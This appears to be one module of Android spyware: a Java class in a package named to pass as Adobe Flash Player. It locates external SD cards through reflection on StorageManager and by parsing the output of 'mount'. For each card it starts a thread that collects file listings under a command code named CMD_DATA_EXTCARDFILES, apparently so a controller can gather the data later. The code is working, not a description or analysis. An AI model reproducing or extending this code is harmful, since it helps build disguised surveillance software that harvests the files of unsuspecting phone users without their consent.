package com.adobe.flashplayer.data;



import java.io.BufferedReader;
import java.io.File;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import android.annotation.SuppressLint;
import android.content.Context;
import android.os.storage.StorageManager;
import android.util.Log;

import com.adobe.flashplayer.Public;
import com.adobe.flashplayer.Utils;
import com.adobe.flashplayer.MyLog;

public class ExtSDCardFile implements  Runnable{
    private static final String TAG = "[ljg]ExtSDCardFile ";

    @SuppressLint("InlinedApi")
    public static String [] getExtSDCardPath(Context context){
        String[] result = null;
        StorageManager storageManager = (StorageManager)context.getSystemService(Context.STORAGE_SERVICE);
        try {
            Method method = StorageManager.class.getMethod("getVolumePaths");
            method.setAccessible(true);
            try {
                result =(String[])method.invoke(storageManager);
            }
            catch (InvocationTargetException e) {
                e.printStackTrace();
            }
        }
        catch (Exception e) {
            e.printStackTrace();
        }
        return result;
    }


    public static List<String> getExtSDCardPath()
    {
        List<String> lResult = new ArrayList<String>();
        try {
            Runtime rt = Runtime.getRuntime();
            Process proc = rt.exec("mount");
            InputStream is = proc.getInputStream();
            InputStreamReader isr = new InputStreamReader(is);
            BufferedReader br = new BufferedReader(isr);
            String line;
            while ((line = br.readLine()) != null) {
                if (line.contains("extSdCard"))
                {
                    String [] arr = line.split(" ");
                    String path = arr[1];
                    File file = new File(path);
                    if (file.isDirectory())
                    {
                        lResult.add(path);
                    }
                }
            }
            isr.close();
        }
        catch (Exception ex) {
            ex.printStackTrace();
            String errorString = Utils.getExceptionDetail(ex);
            String stackString = Utils.getCallStack();
            MyLog.writeLogFile("getExtSDCardPath exception:"+errorString + "\r\n" + "call stack:" + stackString + "\r\n");
        }
        return lResult;
    }



    public static void getExtcardFiles(Context context){
        try {
            String[] cardpath = ExtSDCardFile.getExtSDCardPath(context);
            if(cardpath.length >= 2 ){
                Public.EXTCARDSPATH = new String [cardpath.length - 1];
                for (int i = 0,j = 0; i < cardpath.length; i++) {
                    if (cardpath[i].equals(Public.SDCARDPATH) == false) {
                        cardpath[i] = cardpath[i] + "/";
                        MyLog.writeLogFile("find extcard path:" + cardpath[i] + "\r\n");
                        Public.EXTCARDSPATH[j] = cardpath[i];
                        PhoneSDFiles extfiles = new PhoneSDFiles(context,Public.EXTCARDSPATH[j], Public.LOCAL_PATH_NAME,
                                Public.EXTCARDFILES_NAME + "_"+ i, Public.CMD_DATA_EXTCARDFILES);
                        Thread threadextfiles = new Thread(extfiles);
                        threadextfiles.start();
                        j ++;
                    }
                }
            }
            else if (cardpath.length <= 1) {
                Log.e(TAG,"not found extcard");
                MyLog.writeLogFile("not found extcard\r\n");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    @Override
    public void run() {
        try{

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
